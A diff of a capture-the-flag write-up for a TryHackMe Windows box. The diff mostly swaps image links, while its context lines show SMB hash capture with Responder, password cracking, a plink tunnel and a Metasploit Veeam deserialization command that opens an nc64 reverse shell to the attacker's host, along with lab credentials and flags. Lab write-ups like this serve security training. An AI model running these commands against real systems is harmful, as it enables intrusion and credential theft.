@@ -9,7 +9,7 @@
 ---
 
 
-![nmap](/home/kali/Pictures/SETH/nmap.png)
+<img width="797" height="473" alt="nmap" src="https://github.com/user-attachments/assets/52ae5dfd-8396-42d7-9aa3-ccd47f4d8322" />
 
 
 ---
@@ -249,7 +249,7 @@ https://set.windcorp.thm/assets/data/users.xml
 More recon needed:
 
 
-![appnotes](/home/kali/Pictures/SETH/appnotes.png)
+<img width="957" height="327" alt="appnotes" src="https://github.com/user-attachments/assets/d7d3f65a-967e-498a-ae9d-15645e7245db" />
 
 
 https://set.windcorp.thm/appnotes.txt
@@ -271,7 +271,7 @@ Remember to change your default password at once. It is too common.
 ---
 
 
-![nxc-smb](/home/kali/Pictures/SETH/nxc-smb.png)
+<img width="943" height="138" alt="nxc-smb" src="https://github.com/user-attachments/assets/5d1edc72-6208-4d34-a9da-41d40e83e99a" />
 
 
 username:  			myrtleowe
@@ -281,7 +281,7 @@ password:			Passw@rd
 ---
 
 
-![info-txt](/home/kali/Pictures/SETH/info-txt.png)
+<img width="829" height="182" alt="info-txt" src="https://github.com/user-attachments/assets/81ac65cc-bb38-41c9-977c-f1b5d378da57" />
 
 
 cat Info.txt  
@@ -302,22 +302,20 @@ We need to attack this smb connection by uploading a zip file that hides a force
 There is a program called mslink  here  https://www.mamachine.org/mslink/index.en.html   (grab the bash version for Linux and make sure to use your tun0 address for the call back)
 
 
-![mslink](/home/kali/Pictures/SETH/mslink.png)
-
+<img width="868" height="316" alt="mslink" src="https://github.com/user-attachments/assets/0f5b5ff3-ee58-49b9-b2af-ab6e0882cee6" />
 
 ---
 
 Fire up RESPONDER and then go place the zip file on the SMB server 
 
 
-![myzipfile](/home/kali/Pictures/SETH/myzipfile.png)
+<img width="699" height="480" alt="myzipfile" src="https://github.com/user-attachments/assets/f72353a0-f42d-4ab1-97cd-fc8a2e73b523" />
 
 
 Wait a few seconds and ...
 
 
-![responder](/home/kali/Pictures/SETH/responder.png)
-
+<img width="947" height="315" alt="responder" src="https://github.com/user-attachments/assets/7a21b463-1dbc-4e6c-a038-0a2fb32a0624" />
 
 
 [SMB] NTLMv2-SSP Hash     : MichelleWat::SET:d9086b60e4a82cb5:A808BC879922103E44D9ACDB41177A3A:01010000000000000054ACFE4E47DC01A272EE4EE21938BD0000000002000800340034003400500001001E00570049004E002D003900500038005700430041005400550036004100300004003400570049004E002D00390050003800570043004100540055003600410030002E0034003400340050002E004C004F00430041004C000300140034003400340050002E004C004F00430041004C000500140034003400340050002E004C004F00430041004C00070008000054ACFE4E47DC0106000400020000000800300030000000000000000000000000200000568C6D8677F297F3883242998396990C2231208E39B3D36D12BE8AB7ED532FF30A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310033002E00340035002E003200320037000000000000000000 
@@ -329,7 +327,7 @@ Wait a few seconds and ...
 #  Now crack the hash to grab the password for 'MichelleWat'
 
 
-![john](/home/kali/Pictures/SETH/john.png)
+<img width="902" height="159" alt="john" src="https://github.com/user-attachments/assets/fcb1a3f2-e38b-4574-8b37-0a8985269076" />
 
 
 username:		MichelleWat
@@ -342,7 +340,7 @@ password:		!!!MICKEYmouse
 Now we can log in with evil-winrm
 
 
-![evil-winrm](/home/kali/Pictures/SETH/evil-winrm.png)
+<img width="941" height="421" alt="evil-winrm" src="https://github.com/user-attachments/assets/f0def731-7d3d-4bc4-954b-9a0b7f448289" />
 
 
 Flag2:  THM{690798b1780964f5f51cebd854da5a2ea236ebb5}
@@ -354,7 +352,7 @@ Flag2:  THM{690798b1780964f5f51cebd854da5a2ea236ebb5}
 #  Need to look around and find something as we are blocked from uploading files at the moment:
 
 
-![netstat-ao](/home/kali/Pictures/SETH/netstat-ao.png)
+<img width="625" height="515" alt="netstat-ao" src="https://github.com/user-attachments/assets/ef43613b-0e7b-4fb6-ad15-5bd0f8828a5e" />
 
 
 #  Now, we need to find out what the heck is running on that port. Use the PID and 'Get-Process -Id <PID>'
@@ -370,7 +368,9 @@ Flag2:  THM{690798b1780964f5f51cebd854da5a2ea236ebb5}
 
 We can go to the proper directory and look up the version:
 
-![veeam-version](/home/kali/Pictures/SETH/veeam-version.png)
+
+<img width="943" height="50" alt="veeam-version" src="https://github.com/user-attachments/assets/7ea15e11-14fd-4bcd-9150-baa0b04ebd65" />
+
 
 ---
 
@@ -400,7 +400,7 @@ This module exploits a .NET deserialization vulnerability in the Veeam ONE Agent
 We need to get something on the box that allows us to communicate with that port, like plink.exe??  Which version?
 
 
-![system-info](/home/kali/Pictures/SETH/system-info.png)
+<img width="825" height="330" alt="system-info" src="https://github.com/user-attachments/assets/976d1002-4aee-4e54-9c07-bc2840e32cf3" />
 
 
 Ok, 64-bit.  Go here and grab the 64-bit version of plink.exe:
@@ -427,7 +427,7 @@ Evil-WinRM PS C:\Users\MichelleWat\Documents> Invoke-WebRequest -Uri "http://10.
 Then set it up as a Reverse proxy to port 2805 so we can access that port:
 
 
-![plink](/home/kali/Pictures/SETH/plink.png)
+<img width="941" height="54" alt="plink" src="https://github.com/user-attachments/assets/2ea992fd-b3fd-42cb-9ebf-284f84113d0f" />
 
 
 .\plink.exe -ssh -batch -hostkey "ssh-ed25519 255 SHA256:8CwsEEIlBI8RAddOOZfoOSSOC7uQ55el5KqnTdhwqxM" -l hacker -pw s3cr3t -N -R 2805:127.0.0.1:2805 10.13.45.227
@@ -439,7 +439,7 @@ Then set it up as a Reverse proxy to port 2805 so we can access that port:
 It will hang. Test to see if it is working using nmap:
 
 
-![local-nmap](/home/kali/Pictures/SETH/local-nmap.png)
+<img width="623" height="168" alt="local-nmap" src="https://github.com/user-attachments/assets/fb21ef0b-1f6a-4eb9-a054-f503d676130f" />
 
 
 ---
@@ -448,7 +448,8 @@ It will hang. Test to see if it is working using nmap:
 Set this up in one terminal:
 
 
-![smbserver](/home/kali/Pictures/SETH/smbserver.png)
+<img width="1026" height="307" alt="smbserver" src="https://github.com/user-attachments/assets/d35ec548-7672-49f9-aef7-00ff4b8b2ef3" />
+
 
 `pkill -f smbserver.py || true; smbserver.py -smb2support -debug -username me -password me myshare .`
 
@@ -456,7 +457,7 @@ Set this up in one terminal:
 Set up a listener in another terminal:
 
 
-![pwncat](/home/kali/Pictures/SETH/pwncat.png)
+<img width="1029" height="109" alt="pwncat" src="https://github.com/user-attachments/assets/b00d323a-525c-42c4-9254-cf4bcd9f3bba" />
 
 
 `pwncat-qui -m windows  -lp 4444` 
@@ -707,7 +708,7 @@ For some reason the other writeups don't include the ACTUAL command that works.
 The command can be run inside of msfconsole OR outside --->  I chose outside just so I could modify and run things over and over again without slowly loading msfconsole and typing everything in each time
 
 
-![msfconsole-command](/home/kali/Pictures/SETH/msfconsole-command.png)
+<img width="1908" height="230" alt="msfconsole-command" src="https://github.com/user-attachments/assets/8ae45dc6-f308-4ad2-bace-1f2d4c5605e0" />
 
 
 `msfconsole -q -x "use exploit/windows/misc/veeam_one_agent_deserialization_mod; set RHOSTS 127.0.0.1; set RPORT 2805; set PAYLOAD windows/x64/exec; set CMD cmd.exe /c \"net use a: \\\\\\\\10.13.45.227\\\\myshare /user:me me && a:\\\\nc64.exe 10.13.45.227 4444 -e cmd\"; set target 2; exploit; exit"`
@@ -719,13 +720,14 @@ The command can be run inside of msfconsole OR outside --->  I chose outside jus
 #  We see the smbserver get hit:
 
 
-![connection](/home/kali/Pictures/SETH/connection.png)
+<img width="948" height="229" alt="connection" src="https://github.com/user-attachments/assets/51bbdc2b-cf2f-4130-8761-954ac85c74ee" />
 
 
 And after some small period of time:
 
 
-![system](/home/kali/Pictures/SETH/system.png)
+<img width="947" height="244" alt="system" src="https://github.com/user-attachments/assets/bac50aea-3ddb-41bc-b65f-ef89eb5c8d24" />
+
 
 
 BOOM!! 
@@ -733,9 +735,7 @@ BOOM!!
 Finally! Haha :)
 
 
-
-![flag3](/home/kali/Pictures/SETH/flag3.png)
-
+<img width="937" height="92" alt="flag3" src="https://github.com/user-attachments/assets/71a1182a-8ee9-4397-bd4c-9f1a20b08ed8" />
 
 
 Flag3: THM{934f7faaadab3b040edab8214789114c9d3049dd}
